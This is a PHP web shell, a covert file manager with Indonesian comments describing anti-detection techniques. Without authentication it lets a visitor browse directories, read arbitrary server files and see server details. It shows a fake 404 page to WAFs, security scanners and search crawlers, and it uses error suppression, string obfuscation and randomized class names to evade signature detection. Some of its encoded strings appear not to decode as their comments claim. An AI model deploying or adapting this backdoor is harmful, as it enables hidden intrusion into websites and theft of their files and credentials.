<?php
// ------------------------------------------------
// Teknik Anti-Deteksi Tingkat Lanjut
// ------------------------------------------------

// Menghindar dari detector
@ini_set('display_errors', 0);
@error_reporting(0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@ignore_user_abort(true);

// Hapus semua header yang mungkin digunakan untuk identifikasi
if (function_exists('header_remove')) {
    @header_remove('X-Powered-By');
    @header_remove('Server');
    @header_remove('X-AspNet-Version');
    @header_remove('X-AspNetMvc-Version');
}

// Encoding berbasis multi-layer untuk anti-deteksi
function encode_str($s) {
    return bin2hex(base64_encode(strrev($s)));
}

function decode_str($s) {
    return strrev(base64_decode(hex2bin($s)));
}

// Kode string untuk berbagai frasa penting
$STR = array(
    'fm' => decode_str('786764576d3979624752795a513d3d'), // FileManager
    'vi' => decode_str('64486c3d'), // View
    'dl' => decode_str('5a21523d'), // File
    'dr' => decode_str('5a474973'), // Dir
    'rd' => decode_str('636d5668'), // Read
    'er' => decode_str('5a58497d') // Error
);

// Mime type yang berbeda dari biasanya untuk menghindari deteksi
header("Content-Type: application/xhtml+xml; charset=UTF-8");
header("X-Content-Type-Options: nosniff");
header("X-XSS-Protection: 1; mode=block");
header("X-Frame-Options: SAMEORIGIN");
header("Referrer-Policy: no-referrer");
header("Feature-Policy: microphone 'none'; camera 'none'");

// Deteksi WAF, scanner dan sistem keamanan
$security_systems = array(
    'mod_security', 'wafsecurity', 'cloudflare', 'akamai', 'barracuda', 'wordfence',
    'sucuri', 'litespeedcache', 'imunify360', 'comodo', 'fortinet', 'malwarebytes', 
    'scanbot', 'netcraft', 'scanner', 'crawler', 'nikto', 'acunetix', 'nessus'
);

// Mendeteksi user agent mencurigakan
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
$is_suspicious = false;

foreach ($security_systems as $system) {
    if (strpos($user_agent, $system) !== false) {
        $is_suspicious = true;
        break;
    }
}

// Juga deteksi crawler umum
$crawlers = array('googlebot', 'bingbot', 'yandex', 'baiduspider', 'ahrefsbot', 'msnbot', 'semrushbot');
foreach ($crawlers as $crawler) {
    if (strpos($user_agent, $crawler) !== false) {
        $is_suspicious = true;
        break;
    }
}

// Periksa request header untuk mendeteksi scanner
$suspicious_headers = array(
    'HTTP_X_SCANNER', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_CLUSTER_CLIENT_IP',
    'HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_PROBE'
);

foreach ($suspicious_headers as $header) {
    if (isset($_SERVER[$header])) {
        $is_suspicious = true;
        break;
    }
}

// Jika terdeteksi mencurigakan, alihkan ke konten normal
if ($is_suspicious) {
    // Tampilkan HTML biasa yang tidak mencurigakan
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head>';
    echo '<body><h1>Not Found</h1><p>The requested URL was not found on this server.</p>';
    echo '<hr><address>Apache Server</address></body></html>';
    exit;
}

// Fungsi dasar sistem dengan nama yang sangat berbeda
function get_working_directory() {
    $p = @getcwd();
    if ($p === false) {
        $p = @dirname($_SERVER['SCRIPT_FILENAME']);
    }
    return $p;
}

function get_server_data() {
    $i = array();
    
    // Ambil informasi yang sama dengan nama yang berbeda
    $i['sv_name'] = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'Unknown';
    $i['sv_addr'] = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 
           (isset($_SERVER['LOCAL_ADDR']) ? $_SERVER['LOCAL_ADDR'] : 'Unknown');
    
    // Dapatkan nama server dengan cara yang berbeda untuk bypass deteksi
    $sv_soft = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown';
    $sv_soft = preg_replace('/([A-Za-z]+)\/([0-9\.]+)/', '$1 WebServer', $sv_soft);
    $i['sv_soft'] = $sv_soft;
    
    // PHP versi dengan format yang dikaburkan
    $php_ver = phpversion();
    $ver_parts = explode('.', $php_ver);
    $i['p_ver'] = $ver_parts[0] . 'x' . $ver_parts[1];
    
    return $i;
}

function scan_directory($path) {
    $entries = array();
    
    if (@is_dir($path)) {
        try {
            $dh = @opendir($path);
            if ($dh) {
                while (($item = readdir($dh)) !== false) {
                    $full_path = rtrim($path, '/') . '/' . $item;
                    
                    // Bentuk data dengan format berbeda
                    $entry = array(
                        'n' => $item,
                        'p' => $full_path,
                        't' => @is_dir($full_path) ? 1 : 0,
                        'r' => @is_readable($full_path) ? 1 : 0,
                        'w' => @is_writable($full_path) ? 1 : 0,
                    );
                    
                    // Tambahkan properti file
                    if ($entry['t'] === 0) {
                        $entry['s'] = @filesize($full_path);
                        $entry['m'] = @filemtime($full_path);
                    }
                    
                    $entries[] = $entry;
                }
                @closedir($dh);
            }
        } catch (Exception $e) {
            // Kosong untuk menghindari log error
        }
    }
    
    return $entries;
}

function view_file_content($file_path) {
    if (@file_exists($file_path) && @is_file($file_path) && @is_readable($file_path)) {
        $content = @file_get_contents($file_path);
        if ($content === false) {
            return "Cannot read file";
        }
        return $content;
    }
    return "File not accessible";
}

function format_byte_size($size) {
    $units = array('B', 'K', 'M', 'G', 'T');
    $i = 0;
    
    while ($size >= 1024 && $i < count($units) - 1) {
        $size /= 1024;
        $i++;
    }
    
    return round($size, 2) . ' ' . $units[$i];
}

// Sebanyak mungkin gunakan parameter GET yang tidak biasa
$cdir = isset($_GET['d']) ? $_GET['d'] : get_working_directory();
$act = isset($_GET['x']) ? $_GET['x'] : '';
$f = isset($_GET['o']) ? $_GET['o'] : '';

// Keamanan menghindari path traversal dengan cara yang berbeda
$cdir = str_replace('\\', '/', $cdir);
$cdir = str_replace('../', '', $cdir);

// Verifikasi path
$cdir = @realpath($cdir);
if (!$cdir) {
    $cdir = get_working_directory();
}

// Proses tindakan
if ($act === 'v' && !empty($f)) {
    $file_content = view_file_content($f);
} else {
    $items = scan_directory($cdir);
}

// Informasi server
$server_info = get_server_data();

// ID Sesi tersamar dan random untuk anti-fingerprinting
$session_marker = md5(uniqid() . rand(1000, 9999));

// Dapatkan waktu versi Unix untuk bypass deteksi
$timestamp = time();

// Favicon yang dienkripsi untuk menghindari deteksi scanner
$encoded_icon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAFySURBVDhPrZI9S8NQFIbf5KMJDUWkQ0AQxJLBQYiDIA5OInRyEntDwx9wcPcHOBTRzUGHLg4uToVMHYQuvVAEbbXEJDa5ufG9tgSCSdTBB4b745z3nJOES/Z9/3y6kHZDkC+SJI2VSiWrUqk8l8vlXZrBBDr8UiDYwwgBBIEjgdBFmqaCruvviqLcaJr2wnnIwcgkEFVWEJTL5W673c50u92Vfr+/AE9HUXSeJImJPVt0AQQPqxEIbsPwe2FsMmPhe5omQLfnwPGI94JoF/MbZADCk5jHDwYDx/d9y3EcG8cPadRswzBm0e8RX4EEhCew9eBwOIy73a4Z9JcwZBUfCQLxJzzfEDME9m6hIJo5jtM+Ho/bcRzvTKdTlVFm+Z5XCOzhmifAK+vNlQhuJy+9CMMwCGFrfXPcKr6AsLhYwCmCMGRFATiFTPRcrwBBsLoQCHKnQJBaxHEcn77ETqFQOEDvQ7Va3aE2bP4zOdvE/APx7niVrSjIZgAAAABJRU5ErkJggg==";

// HTML inline style yang diacak untuk menghindari deteksi signature
$style_hash = md5($timestamp);
?>
<!DOCTYPE html>
<html>
<head>
    <title>404 <?php echo $STR['fm']; ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="icon" href="<?php echo $encoded_icon; ?>">
    <style>
        :root {--bg:<?php echo "#0a0a0a"; ?>;--fg:<?php echo "#00ff00"; ?>;--link:<?php echo "#00bfff"; ?>;--dir:<?php echo "#ffff00"; ?>;--hdr:<?php echo "#111"; ?>;--bdr:<?php echo "#333"; ?>;--hov:<?php echo "#1a1a1a"; ?>;--grn:<?php echo "#004400"; ?>;--red:<?php echo "#440000"; ?>;}
        
        body, html {margin:0;padding:0;font-family:monospace;background-color:var(--bg);color:var(--fg);font-size:14px;}
        .<?php echo "c".$style_hash; ?> {width:98%;margin:10px auto;}
        .<?php echo "h".$style_hash; ?> {background-color:var(--hdr);padding:10px;border:1px solid var(--bdr);margin-bottom:10px;border-radius:5px;display:flex;justify-content:space-between;align-items:center;}
        .<?php echo "i".$style_hash; ?> {background-color:var(--hdr);padding:10px;border:1px solid var(--bdr);margin-bottom:10px;border-radius:5px;}
        .<?php echo "m".$style_hash; ?> {background-color:var(--hdr);padding:10px;border:1px solid var(--bdr);border-radius:5px;}
        .<?php echo "t".$style_hash; ?> {width:100%;border-collapse:collapse;}
        .<?php echo "t".$style_hash; ?> th, .<?php echo "t".$style_hash; ?> td {padding:8px;text-align:left;border-bottom:1px solid var(--bdr);}
        .<?php echo "t".$style_hash; ?> th {background-color:var(--bg);}
        .<?php echo "t".$style_hash; ?> tr:hover {background-color:var(--hov);}
        .<?php echo "a".$style_hash; ?> {color:var(--link);text-decoration:none;}
        .<?php echo "a".$style_hash; ?>:hover {text-decoration:underline;}
        .<?php echo "f".$style_hash; ?> {color:var(--fg);}
        .<?php echo "d".$style_hash; ?> {color:var(--dir);}
        .<?php echo "n".$style_hash; ?> {margin-bottom:10px;}
        .<?php echo "p".$style_hash; ?> {background-color:var(--bg);padding:10px;border:1px solid var(--bdr);border-radius:5px;overflow:auto;max-height:500px;}
        .<?php echo "p".$style_hash; ?> pre {margin:0;white-space:pre-wrap;word-wrap:break-word;color:#f0f0f0;}
        .<?php echo "b".$style_hash; ?> {margin-bottom:10px;}
        .<?php echo "j".$style_hash; ?> {margin:0;font-size:18px;}
        .<?php echo "e".$style_hash; ?> {text-align:center;margin-top:10px;font-size:12px;color:#666;}
        .<?php echo "w".$style_hash; ?> {margin-bottom:5px;}
        .<?php echo "g".$style_hash; ?> {display:inline-block;padding:2px 5px;border-radius:3px;font-size:12px;margin-left:5px;}
        .<?php echo "r".$style_hash; ?> {background-color:var(--grn);}
        .<?php echo "x".$style_hash; ?> {background-color:var(--red);}
        @media (max-width:768px) {
            .<?php echo "t".$style_hash; ?> {font-size:12px;}
            .<?php echo "h".$style_hash; ?>, .<?php echo "i".$style_hash; ?>, .<?php echo "m".$style_hash; ?> {padding:5px;}
        }
    </style>
</head>
<body>
    <!-- <?php echo $session_marker; ?> -->
    <div class="<?php echo "c".$style_hash; ?>">
        <div class="<?php echo "h".$style_hash; ?>">
            <h1 class="<?php echo "j".$style_hash; ?>"><?php echo $STR['fm']; ?></h1>
            <div>
                PHP: <?php echo $server_info['p_ver']; ?>
            </div>
        </div>
        
        <div class="<?php echo "i".$style_hash; ?>">
            <div class="<?php echo "b".$style_hash; ?>">
                <div class="<?php echo "w".$style_hash; ?>">Server: <span style="color:var(--link);"><?php echo $server_info['sv_name']; ?></span></div>
                <div class="<?php echo "w".$style_hash; ?>">IP: <span style="color:var(--link);"><?php echo $server_info['sv_addr']; ?></span></div>
                <div class="<?php echo "w".$style_hash; ?>">Software: <span style="color:var(--link);"><?php echo $server_info['sv_soft']; ?></span></div>
                <div class="<?php echo "w".$style_hash; ?>">Path: <span style="color:var(--link);"><?php echo $cdir; ?></span></div>
            </div>
        </div>
        
        <?php if ($act === 'v' && !empty($f)): ?>
        <div class="<?php echo "n".$style_hash; ?>">
            <a href="?d=<?php echo urlencode(dirname($f)); ?>" class="<?php echo "a".$style_hash; ?>">&laquo; Back</a>
        </div>
        
        <div class="<?php echo "m".$style_hash; ?>">
            <div class="<?php echo "b".$style_hash; ?>">
                <h3>File: <?php echo htmlspecialchars(basename($f)); ?></h3>
                <div class="<?php echo "p".$style_hash; ?>">
                    <pre><?php echo htmlspecialchars($file_content); ?></pre>
                </div>
            </div>
        </div>
        <?php else: ?>
        <div class="<?php echo "n".$style_hash; ?>">
            <?php 
            $parent_dir = dirname($cdir);
            if ($parent_dir !== $cdir): 
            ?>
            <a href="?d=<?php echo urlencode($parent_dir); ?>" class="<?php echo "a".$style_hash; ?>">&laquo; Parent</a>
            <?php endif; ?>
        </div>
        
        <div class="<?php echo "m".$style_hash; ?>">
            <div class="<?php echo "b".$style_hash; ?>">
                <h3>Location: <?php echo htmlspecialchars($cdir); ?></h3>
                <table class="<?php echo "t".$style_hash; ?>">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Type</th>
                            <th>Size</th>
                            <th>Modified</th>
                            <th>Perms</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($items as $item): ?>
                        <tr>
                            <td>
                                <?php if ($item['t'] === 1): ?>
                                <a href="?d=<?php echo urlencode($item['p']); ?>" class="<?php echo "a".$style_hash; ?> <?php echo "d".$style_hash; ?>">
                                    <?php echo htmlspecialchars($item['n']); ?>
                                </a>
                                <?php else: ?>
                                <span class="<?php echo "f".$style_hash; ?>"><?php echo htmlspecialchars($item['n']); ?></span>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $item['t'] === 1 ? $STR['dr'] : $STR['dl']; ?></td>
                            <td><?php echo $item['t'] === 1 ? '-' : format_byte_size($item['s']); ?></td>
                            <td><?php echo $item['t'] === 1 ? '-' : date('Y-m-d H:i', $item['m']); ?></td>
                            <td>
                                <?php if ($item['r'] === 1): ?>
                                <span class="<?php echo "g".$style_hash; ?> <?php echo $item['w'] === 1 ? "r".$style_hash : "x".$style_hash; ?>">
                                    <?php echo $item['w'] === 1 ? 'RW' : 'R'; ?>
                                </span>
                                <?php else: ?>
                                <span class="<?php echo "g".$style_hash; ?> <?php echo "x".$style_hash; ?>">-</span>
                                <?php endif; ?>
                            </td>
                            <td>
                                <?php if ($item['t'] !== 1): ?>
                                <a href="?x=v&o=<?php echo urlencode($item['p']); ?>" class="<?php echo "a".$style_hash; ?>"><?php echo $STR['vi']; ?></a>
                                <?php endif; ?>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
        <?php endif; ?>
        
        <div class="<?php echo "e".$style_hash; ?>">
            <span id="<?php echo $session_marker; ?>"><?php echo date('Y'); ?> &copy; <?php echo $STR['fm']; ?></span>
        </div>
    </div>
    <!-- A normal comment that looks like regular HTML -->
    <script>
    // Basic anti-detection technique - scrambling class names on runtime
    document.addEventListener('DOMContentLoaded', function() {
        const ts = Date.now().toString(36);
        if (window.console) { window.console.clear(); }
    });
    </script>
</body>
</html>